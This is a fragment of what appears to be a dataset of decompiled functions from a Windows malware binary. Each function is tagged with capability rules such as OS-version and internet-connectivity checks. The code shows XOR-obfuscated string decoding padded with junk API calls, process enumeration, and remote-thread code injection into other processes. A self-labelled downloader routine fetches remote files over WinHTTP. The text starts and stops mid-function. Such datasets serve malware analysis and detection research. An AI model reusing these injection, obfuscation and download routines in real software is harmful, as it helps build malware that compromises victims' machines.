(*pcVar5)(0, iVar3);\n        (*pcVar8)(uVar1);\n    }\n    else {\ncode_r0x0040c32f:\n        puVar6 = 0x41dbac;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_24h = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_24h = var_24h + 1;\n        }\n    }\ncode_r0x0040c33c:\n    *0x41dbc0 = *0x41dbbc >> 0x20;\n    *0x41dbb8 = *0x41dbb4 >> 0x20;\n    *0x41dbb0 = *0x41dbac >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 2299
    },
    "0040c50d": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c50d(int32_t *arg_8h, int32_t lpStartAddress, int32_t lpParameter, uint32_t arg_14h)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    code *pcVar10;\n    int16_t *piVar11;\n    uint uVar12;\n    uint unaff_EDI;\n    uint uVar13;\n    int64_t iVar14;\n    uint arg_10h;\n    uchar *puVar15;\n    uint uVar16;\n    uchar *puVar17;\n    int32_t *piStack140;\n    int32_t iVar18;\n    uint uStack124;\n    uchar *puStack120;\n    uint uStack116;\n    uint uStack112;\n    uchar auStack108 [4];\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    ushort uStack84;\n    uchar uStack82;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int32_t aiStack56 [2];\n    ushort uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    piStack140 = 0x40c51f;\n    cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    iStack104 = 0;\n    piVar5 = arg_8h + 1;\n    uStack112 = piVar5;\n    if (*piVar5 != 0) {\n        piStack140 = *piVar5;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        *piVar5 = 0;\n    }\n    uVar12 = 0xffffffff;\n    if (((arg_14h & 0x10) == 0) && ((*0x41db4c & 1) != 0)) {\n        uStack124 = 5;\n        iVar14 = CONCAT44(5, puStack120);\n        if (cVar2 == '\\x05') {\n            if ((*0x41e1e0 | *0x41e1e4) == 0) {\n                piStack140 = 0x40c589;\n                fcn.00408e12();\n                pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                piStack140 = 0xb;\n                uStack72 = 0x3b2f1723;\n                uStack68 = 0x27076358;\n                uStack64 = CONCAT22(uStack64._2_2_, 0x343b);\n                uStack88 = 0x574b634d;\n                uStack84 = CONCAT11(uStack84._1_1_, 0x34);\n                uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n                iVar18 = 0;\n                puStack120 = &stack0xffffffac + -iVar3;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n                    if (iVar4 != 0x86a4c2) {\n                        *(iVar18 + iVar3) = (&stack0xffffff9c)[iVar18 % 5] ^ (iVar18 + iVar3)[puStack120];\n                    }\n                    iVar18 = iVar18 + 1;\n                } while (iVar18 < 10);\n                uVar16 = 0xc;\n                uStack68 = 0x79253418;\n                uStack64 = 0x1430561f;\n                uStack60 = uStack60 & 0xff000000 | 0x70593b;\n                uStack92 = 0x35575054;\n                uStack88 = CONCAT22(uStack88._2_2_, 0x3770);\n                iVar3 = (*pcVar10)(8, 0xc);\n                piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                iVar4 = 6;\n                iVar18 = 0;\n                puVar15 = &stack0xffffffb0 + -piVar5;\n                uVar12 = 0xffffffff;\n                uStack112 = piVar5;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_GetCursor)();\n                    uVar13 = piStack140;\n                    if (iVar6 != 0xc9293f) {\n                        *(iVar18 + piVar5) = (&stack0xffffff98)[iVar18 % iVar4] ^ (iVar18 + piVar5)[puVar15];\n                    }\n                    iVar18 = iVar18 + 1;\n                } while (iVar18 < 0xb);\n                iVar14 = fcn.0040931b(piVar5);\n                if (iVar14 != 0) {\n                    arg_10h = 8;\n                    uStack80 = 0x73566111;\n                    uStack76 = 0x330f7a00;\n                    uStack72 = 0x61167216;\n                    uStack68 = 0x7a137351;\n                    uStack64 = 0x72163312;\n                    uStack60 = CONCAT22(uStack60._2_2_, 0x617a);\n                    iStack104 = 0x7333617a;\n                    uStack100 = CONCAT31(uStack100._1_3_, 0x72);\n                    uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x2d);\n                    uStack124 = iVar14 >> 0x20;\n                    puStack120 = iVar14;\n                    piVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                    uStack124 = iVar14 >> 0x20;\n                    puStack120 = iVar14;\n                    iVar18 = 0;\n                    puVar15 = &stack0xffffffa4 + -piVar7;\n                    uVar13 = uVar16;\n                    do {\n                        iVar6 = (*_sym.imp.USER32.dll_GetInputState)();\n                        uStack124 = iVar14 >> 0x20;\n                        puStack120 = iVar14;\n                        if (iVar6 != 0x5d1a59) {\n                            *(iVar18 + piVar7) =\n                                 (&stack0xffffff8c)[iVar18 % iVar3] ^ (iVar18 + piVar7)[&stack0xffffffa4 + -piVar7];\n                        }\n                        iVar18 = iVar18 + 1;\n                    } while (iVar18 < 0x16);\n                    aiStack56[0] = piVar7 >> 0x1f;\n                    piVar11 = piVar7;\n                    do {\n                        iVar1 = *piVar11;\n                        piVar11 = piVar11 + 1;\n                    } while (iVar1 != piStack140);\n                    iVar1 = (piVar11 - (piVar7 + 1) >> 1) * 2;\n                    uStack64 = 0;\n                    uStack68 = CONCAT22(iVar1 + 2, iVar1);\n                    uVar16 = uVar13;\n                    uStack60 = piVar7;\n                    iVar18 = fcn.0040fc70(iVar4, unaff_EDI, 4, 0, 0, 0, 0, 0, &stack0xffffffbc, &stack0xffffffbc >> 0x1f\n                                          , &stack0xffffff94, &stack0xffffff94 >> 0x1f, uVar12, arg_10h);\n                    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uStack124 = iVar14 >> 0x20;\n                    puStack120 = iVar14;\n                    if (iVar18 < 0) {\n                        uVar12 = fcn.004078f9();\n                        uStack124 = iVar14 >> 0x20;\n                        puStack120 = iVar14;\n                    }\n                    else {\n                        uStack92 = 0xf131f26;\n                        uStack88 = 0x1b2f1527;\n                        uStack84 = 0x412;\n                        uStack82 = 0x42;\n                        uStack116 = 0x61617a4d;\n                        uStack112 = CONCAT22(uStack112._2_2_, 0x7942);\n                        iVar18 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n                        uStack124 = iVar14 >> 0x20;\n                        puStack120 = iVar14;\n                        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                        uStack124 = iVar14 >> 0x20;\n                        puStack120 = iVar14;\n                        iVar6 = 0;\n                        puVar17 = &stack0xffffff98 + -iVar4;\n                        uVar13 = uVar16;\n                        do {\n                            iVar8 = (*_sym.imp.USER32.dll_GetCursor)();\n                            uStack124 = iVar14 >> 0x20;\n                            puStack120 = iVar14;\n                            if (iVar8 != 0xc81f31) {\n                                *(iVar6 + iVar4) = (&stack0xffffff80)[iVar6 % puVar15] ^ (iVar6 + iVar4)[puVar17];\n                            }\n                            iVar6 = iVar6 + 1;\n                        } while (iVar6 < 0xb);\n                        iStack104 = 0x3b0a1839;\n                        uStack100 = 0xa381f13;\n                        uStack96 = 0xf0e0837;\n                        uStack92 = 0x1f15323b;\n                        uStack88 = uStack88 & 0xff000000 | 0x5a0b0b;\n                        piVar7 = 0x5a6f6a7a;\n                        uStack124 = CONCAT31(iVar14 >> 0x28, 0x67);\n                        uVar12 = (*pcVar10)(8, 0x14);\n                        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n                        iVar6 = 0;\n                        do {\n                            iVar8 = (*_sym.imp.USER32.dll_CreateMenu)();\n                            if (iVar8 != 0xe472d0) {\n                                *(iVar6 + iVar4) =\n                                     (&stack0xffffff74)[iVar6 % iVar18] ^ (iVar6 + iVar4)[&stack0xffffff8c + -iVar4];\n                            }\n                            iVar6 = iVar6 + 1;\n                        } while (iVar6 < 0x13);\n                        uVar12 = 0xffffffff;\n                        *0x41e1e0 = fcn.0040931b(iVar4);\n                        pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                        uVar16 = (*pcVar10)(0, iVar3);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                        iVar14 = CONCAT44(uStack124, puStack120);\n                    }\n                    uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar7);\n                    uStack124 = iVar14 >> 0x20;\n                    puStack120 = iVar14;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                    uStack124 = iVar14 >> 0x20;\n                    puStack120 = iVar14;\n                    piVar5 = uStack112;\n                }\n                pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n                uStack124 = iVar14 >> 0x20;\n                puStack120 = iVar14;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                uStack124 = iVar14 >> 0x20;\n                puStack120 = iVar14;\n                uVar16 = (*pcVar10)(0, uVar13);\n                uStack124 = iVar14 >> 0x20;\n                puStack120 = iVar14;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                uStack124 = iVar14 >> 0x20;\n                puStack120 = iVar14;\n                piVar5 = uStack112;\n                if (*0x41e1e0 == 0) goto code_r0x0040cd16;\n            }\n            *0x41e1e4 = *0x41e1e0 >> 0x20;\n            piStack140 = arg_8h + 3 >> 0x1f;\n            iVar3 = fcn.0040fc70(*0x41e1e0, *0x41e1e4, 7, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, lpStartAddress, \n                                 lpStartAddress >> 0x1f, lpParameter, lpParameter >> 0x1f);\n            uStack124 = iVar14 >> 0x20;\n            puStack120 = iVar14;\n            *piVar5 = iVar3;\n            if (iVar3 == 0) goto code_r0x0040cd16;\n        }\n        else {\n            if ((*0x41e1e8 | *0x41e1ec) == 0) {\n                piStack140 = 0xb;\n                uStack72 = 0x3b2f1723;\n                uStack68 = 0x27076358;\n                uStack64 = CONCAT22(uStack64._2_2_, 0x343b);\n                uStack80 = 0x574b634d;\n                uStack76 = CONCAT31(uStack76._1_3_, 0x34);\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8);\n                iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                iVar4 = 0;\n                uStack100 = &stack0xffffffac + -iVar18;\n                iStack104 = iVar18;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_CreateMenu)();\n                    if (iVar6 != 0x86a4c2) {\n                        *(iVar4 + iVar18) = (&stack0xffffffa4)[iVar4 % 5] ^ (iVar4 + iVar18)[uStack100];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 10);\n                uStack44 = 0x55b4516;\n                uStack40 = 0x43502111;\n                uStack36 = 0x54373623;\n                uStack32 = 0x360b1245;\n                uStack28 = 0x63225654;\n                uStack92 = 0x46373144;\n                uStack88 = CONCAT31(uStack88._1_3_, 99);\n                uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n                iVar4 = 0;\n                uStack112 = &stack0xffffffc8 + -iVar18;\n                uVar12 = 0xffffffff;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_GetMessageTime)();\n                    if (iVar6 != 0x38febd) {\n                        *(iVar4 + iVar18) = (&stack0xffffff98)[iVar4 % iVar3] ^ *(uStack112 + iVar4 + iVar18);\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0x14);\n                fcn.00408e12();\n                *0x41e1e8 = fcn.0040931b(iVar18);\n                uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar18);\n                pcVar10 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uStack116);\n                (*pcVar10)(uVar16);\n                if (*0x41e1e8 == 0) goto code_r0x0040cd16;\n            }\n            *0x41e1ec = *0x41e1e8 >> 0x20;\n            uVar12 = 0xffffffff;\n            piStack140 = &stack0xffffffb8 >> 0x1f;\n            iVar3 = fcn.0040fc70(*0x41e1e8, *0x41e1ec, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0);\n            if (iVar3 < 0) goto code_r0x0040cd16;\n        }\n    }\n    else {\n        uStack124 = 5;\n        if (cVar2 != '\\x05') {\n            piStack140 = 0xb;\n            aiStack56[0] = 0x3b2f1723;\n            aiStack56[1] = 0x27076358;\n            uStack48 = 0x343b;\n            uStack80 = 0x574b634d;\n            uStack76 = CONCAT31(uStack76._1_3_, 0x34);\n            puVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            iVar18 = 0;\n            uStack100 = &stack0xffffffbc + -iVar3;\n            iStack104 = iVar3;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n                if (iVar4 != 0x86a4c2) {\n                    *(iVar18 + iVar3) = (&stack0xffffffa4)[iVar18 % 5] ^ (iVar18 + iVar3)[uStack100];\n                }\n                iVar18 = iVar18 + 1;\n            } while (iVar18 < 10);\n            uStack44 = 0x55b4516;\n            uStack40 = 0x43502111;\n            uStack36 = 0x54373623;\n            uStack32 = 0x360b1245;\n            uStack28 = 0x63225654;\n            uStack92 = 0x46373144;\n            uStack88 = CONCAT31(uStack88._1_3_, 99);\n            uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n            iVar18 = 0;\n            uStack112 = &stack0xffffffc8 + -iVar3;\n            uVar12 = 0xffffffff;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n                if (iVar4 != 0x38febd) {\n                    *(iVar18 + iVar3) = (&stack0xffffff98)[iVar18 % puVar9] ^ (iVar18 + iVar3)[uStack112];\n                }\n                iVar18 = iVar18 + 1;\n            } while (iVar18 < 0x14);\n            uVar16 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uStack116, iVar3);\n            pcVar10 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar16);\n            if (pcVar10 != NULL) {\n                iVar18 = (*pcVar10)(*arg_8h, 0, 0, 0, 0, 0, lpStartAddress, lpParameter, puVar9, &stack0xffffff94);\n                if (iVar18 < 0) {\n                    uVar12 = fcn.004078f9();\n                }\n                else {\n                    uStack124 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*puVar9, 30000);\n                    if (uStack124 == 0) {\n                        (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*puVar9, &stack0xffffff84);\n                    }\n                    uVar12 = 0;\n                }\n            }\n            uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            pcVar10 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n            uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uStack116);\n            (*pcVar10)(uVar16);\n            goto code_r0x0040cd16;\n        }\n        piStack140 = arg_8h + 3;\n        iVar3 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(*arg_8h, 0, 0, lpStartAddress, lpParameter, 0);\n        *piVar5 = iVar3;\n        if (iVar3 == 0) {\n            uVar12 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x0040cd16;\n        }\n        uStack124 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar3, 30000);\n        if (uStack124 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*piVar5, &stack0xffffff84);\n        }\n    }\n    uVar12 = 0;\ncode_r0x0040cd16:\n    *0x41e1ec = *0x41e1e8 >> 0x20;\n    *0x41e1e4 = *0x41e1e0 >> 0x20;\n    return uVar12;\n}\n",
        "token_count": 4867
    },
    "0040d469": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040d469(code *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    code *var_1ch;\n    uint var_18h;\n    int32_t *lpLibFileName;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t dwSize;\n    \n    var_ch = 0xffffffff;\n    iVar10 = 0;\n    var_8h = 5;\n    var_1ch = param_1;\n    var_18h = param_2;\n    if (*0x41dbc4 == NULL) {\n        var_30h = 0x3b2f1723;\n        var_2ch = 0x27076358;\n        var_28h._0_2_ = 0x343b;\n        var_24h = 0x574b634d;\n        var_20h._0_1_ = 0x34;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        lpLibFileName = iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_CreateMenu)();\n            if (iVar5 != 0x86a4c2) {\n                *(iVar10 + iVar4) = *(&var_24h + iVar10 % var_8h) ^ (iVar10 + iVar4)[&var_30h - iVar4];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 10);\n        var_4ch = 0x2c140e34;\n        var_48h = 0x16030814;\n        var_44h = 0x1f0e0220;\n        var_40h = 0x1c1f1028;\n        var_3ch = 0x10343715;\n        var_38h = 0x372a130e;\n        var_34h._0_1_ = 0x71;\n        var_24h = 0x59457a7a;\n        var_20h._0_1_ = 0x71;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar4 = 0;\n        var_10h = &var_4ch - iVar10;\n        do {\n            iVar6 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n            iVar5 = lpLibFileName;\n            if (iVar6 != 0xfcab04) {\n                *(iVar4 + iVar10) = *(&var_24h + iVar4 % var_8h) ^ (iVar4 + iVar10)[&var_4ch - iVar10];\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x19);\n        uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar10);\n        *0x41dbc4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n    }\n    dwSize = 0;\n    iVar10 = (**0x41dbc4)(5, 0, 0, &dwSize);\n    if (iVar10 == -0x3ffffffc) {\n        dwSize = dwSize + 0x100;\n        piVar7 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n        if (piVar7 != NULL) {\n            lpLibFileName = piVar7;\n            iVar10 = (**0x41dbc4)(5, piVar7, dwSize, 0);\n            uVar3 = var_18h;\n            if (-1 < iVar10) {\n                var_ch = 0;\n                piVar11 = piVar7;\n                do {\n                    iVar10 = piVar11[0x11];\n                    if (((iVar10 != 0) && (iVar10 != 4)) && (iVar10 != *0x41db58)) {\n                        uVar8 = fcn.00408234();\n                        uVar9 = fcn.00409c90();\n                        iVar10 = (*var_1ch)(piVar11[0xf], uVar9, piVar11[0x11], piVar11[0x12], uVar8, uVar3);\n                        piVar7 = lpLibFileName;\n                        if (iVar10 == 0) break;\n                    }\n                    piVar7 = lpLibFileName;\n                    if (*piVar11 == 0) break;\n                    piVar11 = piVar11 + *piVar11;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar7, 0, 0x8000);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 1361
    },
    "00401286": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401286(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint arglist;\n    uint in_EDX;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\ncode_r0x004012c4:\n    do {\n        puVar2[1] = 0;\n        *puVar2 = 0;\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar3 = fcn.00401abf(in_EDX, 0, &arg_8h, &var_4h);\n        if (iVar3 != 0) {\n            arglist = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0x20);\n            fcn.00401f6b(\"<%d>: DOWNLOADER.CPP:%d > GetRemoteFile : Domain=%s, downloading error : %d\", arglist);\ncode_r0x00401300:\n            fcn.0040d3e1();\n            goto code_r0x00401307;\n        }\n        if (arg_8h == NULL) goto code_r0x00401300;\n        uVar1 = *puVar2;\n        if (uVar1 < arg_8h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.0040d3e1();\n            goto code_r0x004012c4;\n        }\n        if (uVar1 < 5) goto code_r0x00401300;\n        if (*puVar2[1] == uVar1) {\ncode_r0x00401307:\n            return *puVar2 != 0;\n        }\n    } while( true );\n}\n",
        "token_count": 394
    },
    "00401317": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00401317(int32_t arg_8h, uint *lpdwNumberOfBytesAvailable, int32_t *arg_10h, int32_t *arg_14h, \n            int32_t lpdwNumberOfBytesRead)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t *in_EDX;\n    code *pcVar6;\n    ushort *puVar7;\n    uint var_41ch;\n    uint lpszHeaders;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    int32_t var_fch;\n    int32_t var_f8h;\n    int32_t var_f4h;\n    uint lpdwBufferLength;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_adh;\n    uint var_a9h;\n    uint var_a5h;\n    uint var_a1h;\n    uint var_9dh;\n    uint var_99h;\n    uint var_95h;\n    uint var_91h;\n    uint var_8dh;\n    uint var_89h;\n    uint var_85h;\n    uint var_81h;\n    uint var_7dh;\n    uint var_79h;\n    uint var_75h;\n    uint var_71h;\n    uint var_6dh;\n    uint var_69h;\n    uint var_65h;\n    uint var_61h;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_51h;\n    int32_t var_4ch;\n    int32_t *var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t lpMultiByteStr;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint *hRequest;\n    uint lpBuffer;\n    uint *var_ch;\n    uint var_8h;\n    \n    puVar4 = &lpszHeaders;\n    var_48h = in_EDX;\n    lpMultiByteStr = in_ECX;\n    for (iVar5 = 0x100; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = &var_41ch;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    if (arg_8h == 0x40) {\n        var_100h = 0;\n        var_104h = 0x34367964;\ncode_r0x0040138c:\n        var_108h = 0x6f62722f;\n    }\n    else {\n        if (arg_8h == 0x20) {\n            var_100h = 0;\ncode_r0x00401382:\n            var_104h = 0x32337964;\n            goto code_r0x0040138c;\n        }\n        if (arg_8h == 0x140) {\n            var_100h = 0x30;\n            goto code_r0x00401382;\n        }\n    }\n    hRequest = &var_108h;\n    if (lpdwNumberOfBytesAvailable != NULL) {\n        hRequest = lpdwNumberOfBytesAvailable;\n    }\n    iVar5 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        return 3;\n    }\n    var_40h = 5;\n    arg_8h = 6;\n    if (*0x41daa0 == 0) {\n        var_ech = 0x76273674;\n        var_e8h = 0x36503528;\n        var_e4h = 0x353e7624;\n        var_e0h = 0x76673658;\n        var_dch = 0x36173567;\n        var_d8h = 0x35727678;\n        var_d4h = 0x761f3611;\n        var_d0h = 0x3657353b;\n        var_cch = 0x353d762c;\n        var_c8h = 0x763b364e;\n        var_c4h = 0x36773572;\n        var_c0h = 0x3572761c;\n        var_bch = 0x7666360f;\n        var_b8h = 0x36023563;\n        var_b4h._0_2_ = 0x7668;\n        var_b4h._2_1_ = 5;\n        stack0xffffff4b = 0x26365035;\n        var_adh = 0xd356476;\n        var_a9h = 0x72767336;\n        var_a5h = 0x7e364135;\n        var_a1h = 0x2356676;\n        var_9dh = 0x20766836;\n        var_99h = 0x72364f35;\n        var_95h = 0xc356076;\n        var_91h = 0x62766636;\n        var_8dh = 0x68361035;\n        var_89h = 0x5c351576;\n        var_85h = 0x39762b36;\n        var_81h = 0x67365635;\n        var_7dh = 0x8356076;\n        var_79h = 0x62767836;\n        var_75h = 0x79360935;\n        var_71h = 0x8356276;\n        var_6dh = 0x14766836;\n        var_69h = 0x3a365035;\n        var_65h = 0x5f353776;\n        var_61h = 0x2a762736;\n        var_5dh = 0x7a361635;\n        var_59h = 0x17356776;\n        var_55h = 0x52767836;\n        var_51h._0_1_ = 0x35;\n        var_ch = 0x76483639;\n        var_8h = CONCAT22(var_8h._2_2_, 0x3552);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x139);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        lpdwNumberOfBytesAvailable = NULL;\n        var_4ch = &var_ech - iVar5;\n        do {\n            iVar2 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            if (iVar2 != 0xe2ba95) {\n                *(lpdwNumberOfBytesAvailable + iVar5) =\n                     *(&var_ch + lpdwNumberOfBytesAvailable % 6) ^ (lpdwNumberOfBytesAvailable + iVar5)[var_4ch];\n            }\n            lpdwNumberOfBytesAvailable = lpdwNumberOfBytesAvailable + 1;\n        } while (lpdwNumberOfBytesAvailable < 0x9c);\n        *0x41daa0 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(iVar5, 0, 0, 0, 0);\n        if (*0x41daa0 == 0) {\n            uVar1 = (*pcVar6)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            return 1;\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetTimeouts)(*0x41daa0, 5000, 5000, 5000, 5000);\n        uVar1 = (*pcVar6)(0, iVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        in_ECX = lpMultiByteStr;\n    }\n    if (in_ECX == 0) {\n        puVar7 = NULL;\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(in_ECX);\n        uVar1 = (*pcVar6)(8, (iVar5 + 1) * 2);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *puVar7 = 0;\n        lpdwNumberOfBytesAvailable = puVar7;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, puVar7, iVar5 + 1);\n    }\n    